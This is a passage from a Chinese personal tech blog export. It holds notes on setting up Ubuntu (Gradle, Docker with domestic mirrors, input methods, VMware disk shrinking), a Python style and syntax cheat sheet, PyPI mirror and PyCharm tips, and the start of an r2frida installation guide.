<h1 id="16-安装-Gradle"><a href="#16-安装-Gradle" class="headerlink" title="16. 安装 Gradle"></a>16. 安装 Gradle</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://downloads.gradle-dn.com/distributions/gradle-7.0.1-bin.zip</span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">mkdir</span> /opt/gradle</span><br><span class="line"></span><br><span class="line">sudo unzip -d /opt/gradle gradle-7.0.1-bin.zip</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/opt/gradle/gradle-7.0.1/bin</span><br></pre></td></tr></table></figure>

<h1 id="17-安装-docker"><a href="#17-安装-docker" class="headerlink" title="17. 安装 docker"></a>17. 安装 docker</h1><h2 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get remove docker \</span><br><span class="line">               docker-engine \</span><br><span class="line">               docker.io</span><br></pre></td></tr></table></figure>

<h2 id="使用-APT-安装"><a href="#使用-APT-安装" class="headerlink" title="使用 APT 安装"></a>使用 APT 安装</h2><p>首先需要添加使用 HTTPS 传输的软件包以及 CA 证书。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加使用 HTTPS 传输的软件包以及 CA 证书。</span></span><br><span class="line">$ sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br></pre></td></tr></table></figure>

<p>需要添加软件源的 GPG 密钥。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 鉴于国内网络问题，强烈建议使用国内源</span></span><br><span class="line">$ curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 官方源</span></span><br><span class="line"><span class="comment"># $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span></span><br></pre></td></tr></table></figure>

<p>向 <code>sources.list</code> 中添加 Docker 软件源。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 官方源</span></span><br><span class="line"><span class="comment"># $ echo \</span></span><br><span class="line"><span class="comment">#   &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="comment">#   $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>以上命令会添加稳定版本的 Docker APT 镜像源，如果需要测试版本的 Docker 请将 stable 改为 test。</p>
</blockquote>
<p>更新 apt 软件包缓存，并安装 docker-ce 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>

<h2 id="使用脚本自动安装"><a href="#使用脚本自动安装" class="headerlink" title="使用脚本自动安装"></a>使用脚本自动安装</h2><p>可以通过 <code>--mirror</code> 选项使用国内源进行安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># $ curl -fsSL test.docker.com -o get-docker.sh</span></span><br><span class="line">$ curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line">$ sudo sh get-docker.sh --mirror Aliyun</span><br><span class="line"><span class="comment"># $ sudo sh get-docker.sh --mirror AzureChinaCloud</span></span><br></pre></td></tr></table></figure>

<p>启动 docker 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl <span class="built_in">enable</span> docker</span><br><span class="line">$ sudo systemctl start docker</span><br></pre></td></tr></table></figure>

<p>建立 docker 用户组，并将当前用户加入 docker 组。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo groupadd docker</span><br><span class="line">$ sudo usermod -aG docker <span class="variable">$USER</span></span><br></pre></td></tr></table></figure>

<p>测试。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> hello-world</span><br></pre></td></tr></table></figure>

<p>镜像加速</p>
<p>查看是否在 <code>docker.service</code> 文件中配置过镜像地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ systemctl <span class="built_in">cat</span> docker | grep <span class="string">&#x27;\-\-registry\-mirror&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果该命令有输出，那么请执行 <code>$ systemctl cat docker</code> 查看 <code>ExecStart=</code> 出现的位置，修改对应的文件内容去掉 <code>--registry-mirror</code> 参数及其值，并按接下来的步骤进行配置。</p>
<p>如果以上命令没有任何输出，那么就可以在 <code>/etc/docker/daemon.json</code> 中写入如下内容（如果文件不存在请新建该文件）。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;https://hub-mirror.c.163.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;https://mirror.baidubce.com&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>之后重新启动服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl daemon-reload</span><br><span class="line">$ sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考： <a href="https://yeasy.gitbook.io/docker_practice/install/ubuntu">https://yeasy.gitbook.io/docker_practice/install/ubuntu</a></p>
</blockquote>
<h1 id="18-neofetch"><a href="#18-neofetch" class="headerlink" title="18. neofetch"></a>18. neofetch</h1><p>Neofetch 是一个命令行系统信息工具。</p>
<p>安装和使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install neofetch</span><br><span class="line">$ neofetch</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考：<a href="https://github.com/dylanaraps/neofetch">https://github.com/dylanaraps/neofetch</a></p>
</blockquote>
<h1 id="安装-Google-输入法"><a href="#安装-Google-输入法" class="headerlink" title="安装 Google 输入法"></a>安装 Google 输入法</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fcitx-googlepinyin</span><br></pre></td></tr></table></figure>

<p>然后进入 language support 设置，安装完整支持，在 Keyboard input method system 选项中选择 fcitx，重启系统。</p>
<p>最后打开输入法配置，添加 Google Pinyin 既可。</p>
<h1 id="安装-Fcitx5-中文输入法"><a href="#安装-Fcitx5-中文输入法" class="headerlink" title="安装 Fcitx5 中文输入法"></a>安装 Fcitx5 中文输入法</h1><p>Ubuntu 设置中打开 <code>Region &amp; language</code> – <code>Manaage Installed Languages</code>，安装 Chinese(simplified) 语言。</p>
<p>然后最小安装 Fcitx 5 ，分别是主程序，中文输入法引擎，图形界面相关。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install fcitx5 \    </span><br><span class="line">fcitx5-chinese-addons \</span><br><span class="line">fcitx5-frontend-gtk3 fcitx5-frontend-gtk2 \</span><br><span class="line">fcitx5-frontend-qt5 kde-config-fcitx5</span><br></pre></td></tr></table></figure>

<p>然后安装<a href="https://github.com/felixonmars/fcitx5-pinyin-zhwiki/releases">中文词库</a>.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载词库文件</span></span><br><span class="line">wget https://github.com/felixonmars/fcitx5-pinyin-zhwiki/releases/download/0.2.4/zhwiki-20220416.dict</span><br><span class="line"><span class="comment"># 创建存储目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/.local/share/fcitx5/pinyin/dictionaries/</span><br><span class="line"><span class="comment"># 移动词库文件至该目录</span></span><br><span class="line"><span class="built_in">mv</span> zhwiki-20220416.dict ~/.local/share/fcitx5/pinyin/dictionaries/</span><br></pre></td></tr></table></figure>

<p>使用 im-config 配置 fcitx5 为首选输入法。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">im-config</span><br></pre></td></tr></table></figure>

<p>设置环境变量，即将以下配置项写入用户或系统环境变量，这里我写入系统环境变量 <code>/etc/profile</code> 中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> XMODIFIERS=@im=fcitx</span><br><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=fcitx</span><br></pre></td></tr></table></figure>

<p>使用 Tweaks 设置 fcitx5 为自动启动。如果没有安装 Tweaks 可以运行下列命令安装。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install gnome-tweaks</span><br></pre></td></tr></table></figure>

<p>使用命令行命令 <code>fcitx5-configtool</code> 打开 Fcitx5 配置图形界面，将 pinyin 加入默认分组中。</p>
<p>可以在 GitHub <a href="https://github.com/search?q=fcitx5+theme&type=Repositories">搜索主题</a>，然后在 Fcitx5 configtool —— Addons —— Classic User Inteface 中设置即可。</p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/508797663">https://zhuanlan.zhihu.com/p/508797663</a></p>
</blockquote>
<h1 id="清理-VMwareWorkstation-linux-虚拟机的磁盘空间"><a href="#清理-VMwareWorkstation-linux-虚拟机的磁盘空间" class="headerlink" title="清理 VMwareWorkstation linux 虚拟机的磁盘空间"></a>清理 VMwareWorkstation linux 虚拟机的磁盘空间</h1><p>在 VMwareWorkstation 安装好 ubuntu 虚拟机使用了一段时间后，发现虚拟机的磁盘占用的空间远远大于 ubuntu 虚拟机使用的空间，导致物理机的磁盘空间不够用了，就想着如何进行清理，在网上找到了两种方法。</p>
<ol>
<li>使用 vmware-vdiskmanager 清理空间</li>
</ol>
<p>进入 ubuntu 虚拟机，执行下列命令释放出磁盘空间。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cat</span> /dev/zero &gt; zero; <span class="built_in">sync</span>; <span class="built_in">sleep</span> 1; <span class="built_in">rm</span> -f zero</span><br></pre></td></tr></table></figure>

<p>当出现下列错误时，说明虚拟机上的剩余空间已经释放完成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span>: write error: No space left on device</span><br></pre></td></tr></table></figure>

<p>然后关闭虚拟机，进入物理机 VMwareWorkstation 的安装目录，执行下列命令，进行碎片整理。只需要对没有编号 vmdk 文件调用命令就可以了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vmware-vdiskmanager -d ubuntu18.vmwarevm/虚拟磁盘.vmdk</span><br><span class="line">  Defragment: 100% <span class="keyword">done</span>.</span><br><span class="line">Defragmentation completed successfully.</span><br></pre></td></tr></table></figure>

<p>接下来压缩空间：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vmware-vdiskmanager -k ubuntu18.vmwarevm/虚拟磁盘.vmdk</span><br><span class="line">  Shrink: 100% <span class="keyword">done</span>.</span><br><span class="line">Shrink completed successfully.</span><br></pre></td></tr></table></figure>

<blockquote>
<p>碎片整理和压缩空间也有图形化界面，就在 设置 -&gt; 磁盘 对应的界面。</p>
</blockquote>
<ol start="2">
<li>使用 VMware Tools 的相关命令</li>
</ol>
<blockquote>
<p>此方法未经验证</p>
</blockquote>
<p>前提是你已经安装了 Vmware-Tools 增强工具，进入虚拟机后，可以直接使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vmware-toolbox-cmd disk list</span><br><span class="line">$ vmware-toolbox-cmd disk shrink /</span><br><span class="line"></span><br><span class="line">Progress: 7 [=&gt;         ]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考：<br><a href="https://zzqcn.github.io/misc/vmware/reduce-disk-size.html#vmware">https://zzqcn.github.io/misc/vmware/reduce-disk-size.html#vmware</a><br><a href="https://blog.csdn.net/Michael__One/article/details/103850274">https://blog.csdn.net/Michael__One/article/details/103850274</a><br><a href="https://www.hesc.info/archives/88">https://www.hesc.info/archives/88</a></p>
</blockquote>
<h2 id="共享文件夹不显示"><a href="#共享文件夹不显示" class="headerlink" title="共享文件夹不显示"></a>共享文件夹不显示</h2><p>内核版本大于 4.0 的虚拟机，使用下列命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other</span><br></pre></td></tr></table></figure>

<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p><a href="https://voidchen.cn/1050TI%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%9A%84Ubuntu18%E5%AE%89%E8%A3%85%E5%AE%9E%E8%AE%B0/">双显卡 1050TI 笔记本的 Ubuntu18 安装实记</a><br><a href="https://linuxconfig.org/how-to-install-the-nvidia-drivers-on-ubuntu-18-04-bionic-beaver-linux">How to install the NVIDIA drivers on Ubuntu 18.04 Bionic Beaver Linux </a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>python Cheat Sheet</title>
    <url>/2020/02/12/python-Cheat-Sheet/</url>
    <content><![CDATA[<h1 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h1><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p><strong>Bad</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class fooClass: ...</span><br><span class="line">class foo_class: ...</span><br></pre></td></tr></table></figure>

<p><strong>Good</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class FooClass: ...</span><br></pre></td></tr></table></figure>

<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><strong>Bad</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def CapCamelCase(*a): ...</span><br><span class="line">def mixCamelCase(*a): ...</span><br></pre></td></tr></table></figure>
<p><strong>Good</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func_separated_by_underscores(*a): ...</span><br></pre></td></tr></table></figure>

<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p><strong>Bad</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FooVar = &quot;CapWords&quot;</span><br><span class="line">fooVar = &quot;mixedCase&quot;</span><br><span class="line">Foo_Var = &quot;CapWords_With_Underscore&quot;</span><br></pre></td></tr></table></figure>

<p><strong>Good</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 局部变量</span><br><span class="line">var = &quot;lowercase&quot;</span><br><span class="line"></span><br><span class="line"># 内部使用</span><br><span class="line">_var = &quot;_single_leading_underscore&quot;</span><br><span class="line"></span><br><span class="line"># 避免与Python关键字冲突</span><br><span class="line">var_ = &quot;single_trailing_underscore_&quot;</span><br><span class="line"></span><br><span class="line"># 私有类属性 (private use in class)</span><br><span class="line">__var = &quot; __double_leading_underscore&quot;</span><br><span class="line"></span><br><span class="line"># &quot;magic&quot; 对象 或属性, ex: __init__</span><br><span class="line">__name__</span><br><span class="line"></span><br><span class="line"># 一次性变量, ex: _, v = (1, 2)</span><br><span class="line">_ = &quot;throwaway&quot;</span><br></pre></td></tr></table></figure>

<h1 id="python-语法"><a href="#python-语法" class="headerlink" title="python 语法"></a>python 语法</h1><h2 id="python-版本"><a href="#python-版本" class="headerlink" title="python 版本"></a>python 版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In [1]: import sys                                                              </span><br><span class="line"></span><br><span class="line">In [2]: sys.version                                                             </span><br><span class="line">Out[2]: &#x27;3.6.9 (default, Nov  7 2019, 10:44:02) \n[GCC 8.3.0]&#x27;</span><br><span class="line"></span><br><span class="line">In [3]: sys.version_info                                                        </span><br><span class="line">Out[3]: sys.version_info(major=3, minor=6, micro=9, releaselevel=&#x27;final&#x27;, serial=0)</span><br><span class="line"></span><br><span class="line">In [4]: import platform                                                         </span><br><span class="line"></span><br><span class="line">In [5]: platform.python_version()                                               </span><br><span class="line">Out[5]: &#x27;3.6.9&#x27;</span><br><span class="line"></span><br><span class="line">In [6]:  sys.version_info &gt;= (3, 6)                                             </span><br><span class="line">Out[6]: True</span><br><span class="line"></span><br><span class="line">In [7]: sys.version_info &gt;= (3, 7)                                              </span><br><span class="line">Out[7]: False</span><br></pre></td></tr></table></figure>

<h2 id="使用range"><a href="#使用range" class="headerlink" title="使用range"></a>使用range</h2><p>在 pthon3 中， 内置函数 <code>range</code> 返回一个迭代 range object 替代列表，等价 python2 中的 <code>xrange</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In [2]: type(range(10))                                                         </span><br><span class="line">Out[2]: range</span><br><span class="line"></span><br><span class="line">In [3]: import sys                                                              </span><br><span class="line"></span><br><span class="line">In [4]: sys.getsizeof(range(10000000000))                                       </span><br><span class="line">Out[4]: 48</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="while…-else-…和for…-else-…"><a href="#while…-else-…和for…-else-…" class="headerlink" title="while… else …和for… else …"></a>while… else …和for… else …</h2><p>当循环中没有&#96;&#96;break<code>出现时，才会执行</code>else&#96; 中的语句。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In [7]: for _ in range(5): </span><br><span class="line">   ...:     pass </span><br><span class="line">   ...: else: </span><br><span class="line">   ...:     print(&quot;no break&quot;) </span><br><span class="line">   ...:                                                                         </span><br><span class="line">no break</span><br><span class="line"></span><br><span class="line">In [10]: for i in range(5): </span><br><span class="line">    ...:     if i == 2: </span><br><span class="line">    ...:         print(&quot;break&quot;, i) </span><br><span class="line">    ...:         break </span><br><span class="line">    ...: else: </span><br><span class="line">    ...:     print(&quot;no break&quot;) </span><br><span class="line">    ...:                                                                        </span><br><span class="line">break 2</span><br></pre></td></tr></table></figure>

<h2 id="try-…-except-…-else-…"><a href="#try-…-except-…-else-…" class="headerlink" title="try … except … else …"></a>try … except … else …</h2><p>没有异常发生时将会执行 <code>else</code> 中的语句.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In [11]: try: </span><br><span class="line">    ...:     print(&quot;no exception&quot;) </span><br><span class="line">    ...: except: </span><br><span class="line">    ...:     pass </span><br><span class="line">    ...: else: </span><br><span class="line">    ...:     print(&quot;Success&quot;) </span><br><span class="line">    ...:                                                                        </span><br><span class="line">no exception</span><br><span class="line">Success</span><br><span class="line"></span><br></pre></td></tr></table></figure>
















]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>Python使用</tag>
      </tags>
  </entry>
  <entry>
    <title>python使用记录</title>
    <url>/2019/12/11/python%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>本文章记录使用 pytho 过程中易忘的知识，方便自己查阅。</p>
<h1 id="设置-pypi-镜像"><a href="#设置-pypi-镜像" class="headerlink" title="设置 pypi 镜像"></a>设置 pypi 镜像</h1><h2 id="临时使用"><a href="#临时使用" class="headerlink" title="临时使用"></a>临时使用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple some-package</span><br></pre></td></tr></table></figure>

<p>注意，simple 不能少, 是 https 而不是 http</p>
<h2 id="设为默认"><a href="#设为默认" class="headerlink" title="设为默认"></a>设为默认</h2><p>升级 pip 到最新的版本 (&gt;&#x3D;10.0.0) 后进行配置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pip -U</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清华源</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或：</span></span><br><span class="line"><span class="comment"># 阿里源</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"><span class="comment"># 腾讯源</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url http://mirrors.cloud.tencent.com/pypi/simple</span><br><span class="line"><span class="comment"># 豆瓣源</span></span><br><span class="line">pip config <span class="built_in">set</span> global.index-url http://pypi.douban.com/simple/</span><br></pre></td></tr></table></figure>

<h1 id="Python-中-join-函数和-os-path-join-用法"><a href="#Python-中-join-函数和-os-path-join-用法" class="headerlink" title="Python 中 join 函数和 os.path.join 用法"></a>Python 中 join 函数和 os.path.join 用法</h1><blockquote>
<p>join ： 连接字符串数组。将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串</p>
</blockquote>
<blockquote>
<p>os.path.join() ： 将多个路径组合后返回</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：&#x27;sep&#x27;.join（seq）</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">    sep：分隔符。可以为空</span><br><span class="line">    seq：要连接的元素序列、字符串、元组、字典等</span><br><span class="line">上面的语法即：以sep作为分隔符，将seq所有的元素合并成一个新的字符串.</span><br><span class="line"></span><br><span class="line">返回值：返回一个以分隔符sep连接各个元素后生成的字符串</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">seq = [&#x27;hello&#x27;, &#x27;world&#x27;, &#x27;世界&#x27;,&#x27;你好&#x27;]</span><br><span class="line">print(&#x27; &#x27;.join(seq))</span><br><span class="line">print(os.path.join(&#x27;home&#x27;, &quot;me&quot;, &quot;mypath&quot;))</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello world 世界 你好</span><br><span class="line">home/me/mypath</span><br></pre></td></tr></table></figure>

<h1 id="pycharm-设置忽略大小写进行自动补齐"><a href="#pycharm-设置忽略大小写进行自动补齐" class="headerlink" title="pycharm 设置忽略大小写进行自动补齐"></a>pycharm 设置忽略大小写进行自动补齐</h1><p>进入下列设置</p>
<blockquote>
<p>settings -&gt; Editor -&gt; General -&gt; Code Completion</p>
</blockquote>
<p>将 <code>Match case</code> 不勾选就可以忽略大小写进行自动补齐了。</p>
<h1 id="pycharm-设置-python-代码模板"><a href="#pycharm-设置-python-代码模板" class="headerlink" title="pycharm 设置 python 代码模板"></a>pycharm 设置 python 代码模板</h1><p>设置 File &gt; Settings &gt; File and Code Template &gt; Python Script</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># File Name : $&#123;NAME&#125;</span><br><span class="line"># Created by $&#123;USER&#125; on $DATE</span><br><span class="line"></span><br><span class="line">__author__ = &#x27;$&#123;USER&#125;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>一些模板变量含义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PROJECT_NAME&#125; - 当前Project名称;</span><br><span class="line"> $&#123;NAME&#125; - 在创建文件的对话框中指定的文件名;</span><br><span class="line"> $&#123;USER&#125; - 当前用户名;</span><br><span class="line"> $&#123;DATE&#125; - 当前系统日期;</span><br><span class="line"> $&#123;TIME&#125; - 当前系统时间;</span><br><span class="line"> $&#123;YEAR&#125; - 年;</span><br><span class="line"> $&#123;MONTH&#125; - 月;</span><br><span class="line"> $&#123;DAY&#125; - 日;</span><br><span class="line"> $&#123;HOUR&#125; - 小时;</span><br><span class="line"> $&#123;MINUTE&#125; - 分钟；</span><br><span class="line"> $&#123;PRODUCT_NAME&#125; - 创建文件的IDE名称;</span><br><span class="line"> $&#123;MONTH_NAME_SHORT&#125; - 英文月份缩写, 如: Jan, Feb, etc;</span><br><span class="line"> $&#123;MONTH_NAME_FULL&#125; - 英文月份全称, 如: January, February, etc；</span><br></pre></td></tr></table></figure>

<h1 id="pycharm-打开虚拟环境时，代码无法补全"><a href="#pycharm-打开虚拟环境时，代码无法补全" class="headerlink" title="pycharm 打开虚拟环境时，代码无法补全"></a>pycharm 打开虚拟环境时，代码无法补全</h1><p>打开设置，按如下图所示添加对应的 python 虚拟环境</p>
<img src="/2019/12/11/python%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2020-01-27-13-31-34.png" class="">

<h1 id="PYTHONPATH-作用"><a href="#PYTHONPATH-作用" class="headerlink" title="PYTHONPATH 作用"></a>PYTHONPATH 作用</h1><p>PYTHONPATH 是 Python 搜索路径，默认我们 import 的模块都会从 PYTHONPATH 里面寻找。</p>
<p>默认情况下，PYTHONPATH 是个空值，可以通过命令设置临时环境变量 PYTHONPATH 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># windows</span></span><br><span class="line"><span class="built_in">set</span> PYTHONPATH=path1;path2</span><br><span class="line"></span><br><span class="line"><span class="comment"># linux</span></span><br><span class="line"><span class="built_in">export</span>  PYTHONPATH=path1:path2</span><br></pre></td></tr></table></figure>

<p>pycharm 默认会设置 PYTHONPATH 为源码根目录，vscode 则不会设置。</p>
<p>python 中获取 PYTHONPATH 值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&#x27;PYTHONPATH&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h1 id="Django-测试脚本"><a href="#Django-测试脚本" class="headerlink" title="Django 测试脚本"></a>Django 测试脚本</h1><p>当你只是想测试 django 中的某一个 py 文件内容 那么你可以不用书写前后端交互的形式，而是直接写一个测试脚本即可</p>
<p>测试环境的准备：</p>
<p>去 manage.py 中拷贝前四行代码 然后自己写两行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">​</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.environ.setdefault(<span class="string">&quot;DJANGO_SETTINGS_MODULE&quot;</span>, <span class="string">&quot;day64.settings&quot;</span>)</span><br><span class="line">    <span class="keyword">import</span> django</span><br><span class="line">    django.setup()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个代码块的下面就可以测试 django 里面的单个 py 文件了。</p>
<blockquote>
<p><a href="https://www.strongforu.top/archives/153">https://www.strongforu.top/archives/153</a></p>
</blockquote>
<h1 id="locals-和-globals-以及反射"><a href="#locals-和-globals-以及反射" class="headerlink" title="locals 和 globals 以及反射"></a>locals 和 globals 以及反射</h1>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>Python使用</tag>
      </tags>
  </entry>
  <entry>
    <title>r2Frida环境配置及使用</title>
    <url>/2019/12/21/r2Frida%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>本机环境：ubuntu 18.04</p>
</blockquote>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="安装-redare2"><a href="#安装-redare2" class="headerlink" title="安装 redare2"></a>安装 <a href="https://github.com/radareorg/radare2">redare2</a></h2><p>参考 github 使用下列命令安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/radare/radare2.git</span><br><span class="line">$ cd radare2</span><br><span class="line">$ ./sys/user.sh</span><br></pre></td></tr></table></figure>
<img src="/2019/12/21/r2Frida%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8/2019-12-22-00-01-14.png" class="">

<p>安装完成之后，配置 <code>PATH</code> 变量，我这里将下列文本添加值 <code>.zshrc</code> 和 <code>.bashrc</code> 中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH=/home/ckcat/bin:$PATH</span><br></pre></td></tr></table></figure>
<p>配置好之后，执行 <code>source .zshrc</code> 命令,然后执行 <code>r2</code> 命令，显示如下则表示安装成功。</p>
<img src="/2019/12/21/r2Frida%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8/2019-12-22-00-06-27.png" class="">


<h2 id="安装-r2frida"><a href="#安装-r2frida" class="headerlink" title="安装 r2frida"></a>安装 <a href="https://github.com/nowsecure/r2frida">r2frida</a></h2><p>参考 github ，首先安装依赖，使用以下命令安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt install -y make gcc libzip-dev nodejs npm curl pkg-config git</span><br></pre></td></tr></table></figure>
